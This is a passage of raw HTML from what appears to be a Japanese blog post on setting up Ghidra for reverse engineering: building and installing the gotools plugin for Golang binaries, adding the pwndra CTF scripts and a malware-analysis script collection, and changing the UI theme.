/static/e8fbd4cae5123539d422b89d463da5c4/d3be9/image-20220307205731760.webp 480w,
/static/e8fbd4cae5123539d422b89d463da5c4/e46b2/image-20220307205731760.webp 960w,
/static/e8fbd4cae5123539d422b89d463da5c4/6b83e/image-20220307205731760.webp 1019w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e8fbd4cae5123539d422b89d463da5c4/8ff5a/image-20220307205731760.png 240w,
/static/e8fbd4cae5123539d422b89d463da5c4/e85cb/image-20220307205731760.png 480w,
/static/e8fbd4cae5123539d422b89d463da5c4/d9199/image-20220307205731760.png 960w,
/static/e8fbd4cae5123539d422b89d463da5c4/159fb/image-20220307205731760.png 1019w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e8fbd4cae5123539d422b89d463da5c4/d9199/image-20220307205731760.png&quot;
            alt=&quot;image-20220307205731760&quot;
            title=&quot;image-20220307205731760&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;gotoolsの導入&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gotools%E3%81%AE%E5%B0%8E%E5%85%A5&quot; aria-label=&quot;gotoolsの導入 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;gotoolsの導入&lt;/h2&gt;
&lt;p&gt;EclipseにGhidra Dev拡張をインストールしたら、gotoolsをセットアップします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/felberj/gotools&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GitHub - felberj/gotools: Plugin for Ghidra to assist reversing Golang binaries&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gotoolsはGolangでビルドされたx86_64向けのバイナリの解析をサポートしてくれる拡張機能です。&lt;/p&gt;
&lt;p&gt;詳しくは&lt;a href=&quot;https://www.amazon.co.jp/%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0%E3%83%84%E3%83%BC%E3%83%ABGhidra%E5%AE%9F%E8%B7%B5%E3%82%AC%E3%82%A4%E3%83%89-%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%B3%E3%83%B3%E3%83%86%E3%82%B9%E3%83%88%E5%85%A5%E9%96%80%E3%81%8B%E3%82%89%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A7%E3%82%A2%E8%A7%A3%E6%9E%90%E3%81%BE%E3%81%A7-Compass-Books%E3%82%B7%E3%83%AA%E3%83%BC%E3%82%BA-%E4%B8%AD%E5%B3%B6/dp/4839973776/ref=sr_1_1?__mk_ja_JP=%E3%82%AB%E3%82%BF%E3%82%AB%E3%83%8A&amp;#x26;crid=1LZGMPJ1WOENM&amp;#x26;keywords=Ghidra&amp;#x26;qid=1647343767&amp;#x26;sprefix=ghidr%2Caps%2C181&amp;#x26;sr=8-1&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リバースエンジニアリングツールGhidra実践ガイド&lt;/a&gt;に書いてあります。&lt;/p&gt;
&lt;p&gt;まずは&lt;a href=&quot;https://github.com/felberj/gotools&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;gotools&lt;/a&gt;からコードをcloneしてEclipseのメニューからプロジェクトを開きます。&lt;/p&gt;
&lt;p&gt;この時、[Linked Resource]の設定を、自分の環境のGhidraのPathに設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e0f1bd673ef910de6b761b03a44844c9/77672/image-20220307210038684.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACe0lEQVQ4y2VU246bMBDlaytVVdWHPnQ/Yn+n7Vb73m6b+025QWADBAwESEiAAMnpjAnRKmvlaMaxczzneBzl+48ntNod/P7zgpe//9DudCQ6nS7a7Toyev0B+oMh+v1hHQmD4QgDip1uD/PFAh8+foZiWyaOaYZ4lyCIAjjeBlvfhec7CCgPt1uEYYjdLibsJA6HA5IkQRTF2F+jT7//9OUrlNl0Ck94yPKciI8QroOVqsO2bQghsCVC3/cRBIHM30J4PsGDR9ERPp6fn6GMqWzHcVBVFXjwRiZjkpwO4YqWiyUsy5L5fp8Q9td8f0OyjxFGERRtpcNcm3LD+XyWcnw6Udd1Ket4PMLQDbiOSxZ4iEh+SkryPEOeMVI5571cmKJpKyJcwzKtW2UeSRVkAw/2d2070NYu3DiDGx5geTFEdISzTRCmFeK0xJSsm0wmRKiqsIiQq9A0TVbieYIk2tKGjKrITifkRUk4E+i7U4k0LyR4zjGOY+m5lGyZpiRcrVZwNo5cYMnsIUuryhK4XOhzxoVs4VjPLzKWZSHVpGlaS24IDcPAhnzgGxWukNUxaUmE7C+jqs63vEFB1TM5+/+OkH0sivrE5tSGkC24R01Y3BNaV8m6bA8maAZX2bTU5SrzLXg069wR11uuK3T4Qsi/PD/dPOJNXCVLlxd0B1470B6Wzf2oqKp2k+z7Afm3ldJd15XwqPeaXMh2ErfcpgJa4yW6ExW68YrRaATFoMR8XWN97UW+kDgK5YuJqPObl8D+nKh97pFm/GRTKfnx8RHKz6dfaLXa6PX6GI8nErP5HPP5QoLz2ayeL5fqe1AfL+ifZkOX+e3hAf8BB6xg5a9bFgMAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e0f1bd673ef910de6b761b03a44844c9/8ac56/image-20220307210038684.webp 240w,
/static/e0f1bd673ef910de6b761b03a44844c9/d3be9/image-20220307210038684.webp 480w,
/static/e0f1bd673ef910de6b761b03a44844c9/e46b2/image-20220307210038684.webp 960w,
/static/e0f1bd673ef910de6b761b03a44844c9/e811e/image-20220307210038684.webp 1060w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e0f1bd673ef910de6b761b03a44844c9/8ff5a/image-20220307210038684.png 240w,
/static/e0f1bd673ef910de6b761b03a44844c9/e85cb/image-20220307210038684.png 480w,
/static/e0f1bd673ef910de6b761b03a44844c9/d9199/image-20220307210038684.png 960w,
/static/e0f1bd673ef910de6b761b03a44844c9/77672/image-20220307210038684.png 1060w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e0f1bd673ef910de6b761b03a44844c9/d9199/image-20220307210038684.png&quot;
            alt=&quot;image-20220307210038684&quot;
            title=&quot;image-20220307210038684&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここまで完了したら、Eclipseの[Ghidra Module Extension…]メニューからgotoolsをビルドしてGhidraにインストールします。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 584px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/6f70b0da3430921d6de2296e2b100d54/e05eb/image-20220307210114259.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 84.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAABxElEQVQ4y72Ue6+aQBDF+f4frP2niWCD8hKUN6LyuqAIeDozrZba9No0NyX5ZWDZPZzZmUUZhgFd1+J8PlPscLlc5H6appfcbjeKN4kCAMVzPQR+gKoqcTweURQnnE4nNE2Dsizf5ZDnMv94yHEQDlAsw0ISp3hr31BXNeqaaei+wjCOP1w8u5owjhPatkPb9YiyAp7nwY8zKIHvw7ZtwTItGGsDtmXDNAwUZYU/XaQnXEfgVF+gLlSsDRPKfr+X9GpCIjmrJKUKOaXU0r72fS97O6fvCYrD9UpOGzKyRhRGULbbLdyNi3v0gwC6rsO0LMRxjICefcqC4xzf/znuOA7CKBJDShiGUgSGi8Kwa3bHm/wKXpckCXa7nRRKiUj5uXoVpf2qwne4iGyA3fK6h2BRFP8Ei7wr+LfO7mv+v+CHpfz85Q/dQ37xHarinVkHzLvgtypzY2bZXvqJBbn/uKGZkM64G2ZwgxTbOEeSpojJAL9jkZSeGTb1EOSGdL2dNDSL8gc0TcNSU7HQLXxeOvi0WOGLGcpZ1VQVy+VXOVmmaWKlr+C6rjT2wyEPPMN/D47OxoNDvzh78+v4fB4fPT4tLPgNqp3/uDk+tw4AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/6f70b0da3430921d6de2296e2b100d54/8ac56/image-20220307210114259.webp 240w,
/static/6f70b0da3430921d6de2296e2b100d54/d3be9/image-20220307210114259.webp 480w,
/static/6f70b0da3430921d6de2296e2b100d54/ec52f/image-20220307210114259.webp 584w&quot;
              sizes=&quot;(max-width: 584px) 100vw, 584px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/6f70b0da3430921d6de2296e2b100d54/8ff5a/image-20220307210114259.png 240w,
/static/6f70b0da3430921d6de2296e2b100d54/e85cb/image-20220307210114259.png 480w,
/static/6f70b0da3430921d6de2296e2b100d54/e05eb/image-20220307210114259.png 584w&quot;
            sizes=&quot;(max-width: 584px) 100vw, 584px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/6f70b0da3430921d6de2296e2b100d54/e05eb/image-20220307210114259.png&quot;
            alt=&quot;image-20220307210114259&quot;
            title=&quot;image-20220307210114259&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでGhidraにgotools拡張がインストールされました。&lt;/p&gt;
&lt;h2 id=&quot;スクリプトの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;スクリプトの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;スクリプトの設定&lt;/h2&gt;
&lt;p&gt;次にGhidra Scriptの設定を行います。&lt;/p&gt;
&lt;p&gt;Ghidraにスクリプトを追加する方法はとても簡単で、Script ManagerからBundle Managerを開いて、スクリプトの配置されたフォルダを開くだけです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3359e1b11c7485f3894c2e20409e870f/eb3fa/image-20220315205550826.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 95.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAADRUlEQVQ4y41Ui27aShD1//9Jbytd9UqkicJtyDskKRCCMX6tn/gFGPwgBIM5nd2U9KFW6UpHu17Pzp45M7PSOHYxny+QZRnKssR6vcamWmPLsdnPFTabDaH6hg2qqhL4cf1E56X/Pjdw1jrF1fU1ms3/0To9Q/O8jeZVByc3PVx0FFx3ZfQe+hipGgzDBGMWhsoI8lDBYCBjqGnoDnoYfOlCGsjn8FyGxSKHqjMksxx3fQ3n9zJu+zp6qgvNidHrD/HwqOBxqOFhMIIfTrEontGlfdP2xT9Gs+SyL4gjF0WxhOuHqGrAYC4e6VAYTVEu11jkT9CZB0WzoJmumNPsSdjy/XiaERkbXpBAcsx7MJNu9APYboBiVUMembi568HxE5TPO8yyFUa6g6FKoapM/J+kpbA1LB/T+ZJYq3C8CJJl3MJ1dEpKAeYaJO4aZZ4hm6coi1wkpCbhl7QuywJ5nosEiuRttuJ7va5IsgWCIHxxqKkDhGGMszNKyMk5bjqPuCdtOnRrVybNFAMyhaQaDJbFMA4Csg8RxzFmsxkM36B9C55HGjL9FhZThcP2bQetu3tcdBXc9A10RjbBQVclaC4Gqgld1+G4Hkk0hj8OMCa4vgePvhljkGzjDmPfwjPRtmwXzPHokIzAY5SsEEkcIQoDTGhOkoRYJZhOpyio5ni4RVFiukiQFSlUzaCQiSFPyvJpBcvxcdQ8wfsP71BmEWlUY7vdYkPY/oqa/6vFzIubD5eYU8htOLaG1eoZNrE7Pmnh/b8fgR3+eux2L8ZCw6Hcg22T0GECkzlonl7jQ+MzdvX21fgt1MTy1SGnyVPuBxFpUqB1cYV/Ph6QYf3T7X9kR/jJIa+pMIqQUvpnsylarRYajcar0ZsOd99tJpMJaUiZtb1AbPDCPD4+xtHRkRD8b0PeO1wsMki8liIqUp45zury8hIHBwdvMvvd4NJJfJFluXjP9g55yLy1qmojmNb7EvlWMi9v43dUhLreIU3nkLgB13HPqN1u4/DwkDpgDMdxERD7MKTipjbjhc3BQ+Mk+Lk9eJEH1JKC4UjVSbsmPn06hKIo9ILPRY9yTCaJEJv3ruM4ME1T9DC3SdP0FdypYRj4CqWKiu+7s+iEAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3359e1b11c7485f3894c2e20409e870f/8ac56/image-20220315205550826.webp 240w,
/static/3359e1b11c7485f3894c2e20409e870f/d3be9/image-20220315205550826.webp 480w,
/static/3359e1b11c7485f3894c2e20409e870f/e46b2/image-20220315205550826.webp 960w,
/static/3359e1b11c7485f3894c2e20409e870f/1dc52/image-20220315205550826.webp 1026w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3359e1b11c7485f3894c2e20409e870f/8ff5a/image-20220315205550826.png 240w,
/static/3359e1b11c7485f3894c2e20409e870f/e85cb/image-20220315205550826.png 480w,
/static/3359e1b11c7485f3894c2e20409e870f/d9199/image-20220315205550826.png 960w,
/static/3359e1b11c7485f3894c2e20409e870f/eb3fa/image-20220315205550826.png 1026w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3359e1b11c7485f3894c2e20409e870f/d9199/image-20220315205550826.png&quot;
            alt=&quot;image-20220315205550826&quot;
            title=&quot;image-20220315205550826&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;pwndraをセットアップする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#pwndra%E3%82%92%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;pwndraをセットアップする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;pwndraをセットアップする&lt;/h3&gt;
&lt;p&gt;pwndraはCTFに便利なGhidra Scriptです。&lt;/p&gt;
&lt;p&gt;以下のリポジトリのリリースページからダウンロードしたファイルを解凍してGhidraに追加します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/0xb0bb/pwndra&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;0xb0bb/pwndra: A collection of pwn/CTF related utilities for Ghidra&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ghidra_scriptsをセットアップする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ghidra_scripts%E3%82%92%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;ghidra_scriptsをセットアップする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ghidra_scriptsをセットアップする&lt;/h3&gt;
&lt;p&gt;以下からダウンロードしたファイルをGhidraに展開します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/AllsafeCyberSecurity/ghidra_scripts&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;AllsafeCyberSecurity/ghidra_scripts: Ghidra scripts for malware analysis&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;おまけuiの変更&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91ui%E3%81%AE%E5%A4%89%E6%9B%B4&quot; aria-label=&quot;おまけuiの変更 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;おまけ：UIの変更&lt;/h2&gt;
&lt;p&gt;GhidraのUIテーマは[Edit]&gt;[Tool Options]の以下の箇所から変更できます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/42009ec2148c80cf36a3ff12b7ccfd32/b12f7/image-20220315204356018.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 80.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACAUlEQVQ4y5VU7XKiQBDc93+K/Mjv5B0ularkvJwRBI0KrEFUPuRjRdES7ZtBpKLlVeJWdS0ws709vbOIYOIhikIEQQilFJbLJdZFgaLYEIozrK9hXSBfrbDdbtFqaxB6X8fHyMFsNkMYhojjGEnCSH4MXqNUhpfWX4iW/ozf71247gSLxaIivRUBYRFFeHp+hXCtAeZTjwIRlb5AlmVV2UrdAoVVnuO904XodduYjB145GWer7DZbKoymDglZD9Amqa0NoeUYwjN/EDLtKEowKMsy8oTTrrFR1Zp2zaEnMwwzw84jd1u1xB+xTWSrzG2yXEcCDaTx36/rwnLM0JODoLgqupjR9QKl+pI6FMyj8PhcJXw9BzRxhaVJMdjeNMpYiZksnoTxQq55KhW+D9CTo7ofUrJvft79O7uMKTZfXiA//iIWNeRLI8nXRHygm8JadOp52FkGOi1qStGI6TzOWJSmlAPssqK0JEQge9/6yGDm97nJibykJ5jtoPjp5KZUEpu7NEF4e7iANLmRLMap1h60TaOZUHMbOus5P2+RMKEN/QgY0U/CMkeDrs6SuLa0N+C1al8TWXFzQ1obgspSOvb04AV08zXlk++b5oQf55+4ZNql6T0k/rIJsMlze6YvpHJWs+GYZgwOx0YmgaH4pwnqTxe5xKs4QCDfh/a2xv+AV8jtYqyCVAQAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/42009ec2148c80cf36a3ff12b7ccfd32/8ac56/image-20220315204356018.webp 240w,
/static/42009ec2148c80cf36a3ff12b7ccfd32/d3be9/image-20220315204356018.webp 480w,
/static/42009ec2148c80cf36a3ff12b7ccfd32/e46b2/image-20220315204356018.webp 960w,
/static/42009ec2148c80cf36a3ff12b7ccfd32/52c2b/image-20220315204356018.webp 1020w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/42009ec2148c80cf36a3ff12b7ccfd32/8ff5a/image-20220315204356018.png 240w,
/static/42009ec2148c80cf36a3ff12b7ccfd32/e85cb/image-20220315204356018.png 480w,
/static/42009ec2148c80cf36a3ff12b7ccfd32/d9199/image-20220315204356018.png 960w,
/static/42009ec2148c80cf36a3ff12b7ccfd32/b12f7/image-20220315204356018.png 1020w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/42009ec2148c80cf36a3ff12b7ccfd32/d9199/image-20220315204356018.png&quot;
            alt=&quot;image-20220315204356018&quot;
            title=&quot;image-20220315204356018&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;以下はWindows環境における各テーマのUIです。&lt;/p&gt;
&lt;p&gt;Linuxの場合はディストリビューションごとにテーマやデザインが変わります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;System&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/76592cfa96f0184b7294437164e84f9e/eb4a1/image-20220307204726489.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChUlEQVQ4y51UyW4TQRCd/+QP+BBuwAeAQLlzAAUOSByicEnkzOKZScb27Pu+2mM7duxHdScCsYitpKfqqe6qfl3LCBPNRhA3cMMaHiHJB/pu4ROYzQ0bBEmHMB3gRS2hgRd3cMnHT5ito/0eTtjiyUsFwvnnC5jmDFEYQJJEqKqCmXED17HheQ6SOERMyJMElmki8E34oYcL8RK26yAvU5RFRuciPD+ZQjg7O4eqKYiiGLbjkHOMLMvRtC36fsBqHLFcrjAMPeklVqsRWZrCMmxUWYOB9vphQFnVePZahtA0PZjc3u7IaeDrVd9jM66x2W6x3+857u7uOA6HAw88rkd+lu0x25bOnn6aQ2gfAjJj13VcR0EEx7LoyR7KskLTNMRshfV6/R1GYv9Nj3SuhSBfieTow/d9ZHnGgyuGiEtlijBKUBQ5BS3/iLqmAnoBBElUKGcZUkJBG0wcz4Qxv0YQRpx1Rynout+h42nwfQo4N10e5Hg8ciPLCbuNLPhXqYiQoOk3/GO32/GqssSXD0zZJX8DlncmSZJBOD19j5TawKH3x1lBAfeoqgr/I1GUQjh59QL6tQFdnfL+ur8ppRZafq3ierMh/QuQfbPZ8vUtvXBmehA+vH1DAWKeWNOyaVI0yFMJnu8hpKKwtmGMf0bNNStoURQ877OFQ22jzyh/WxwPR6IcwbYc6KaMss45y54q/CPY5W3b8f5kvcpexPK+WFgQFG3Bn8nGh43RfbUquK6LIAjgk4NHaw7P5QHCMKT5LShIQSxLzrBpaqj6gory7iN8mgyD6N7M6Yfgh9B0A1fUn5I8hSgptJYfoGAyEUlL9CNRICsqQcNUvcbkSsajx0/xBXGqYDX8YqydAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
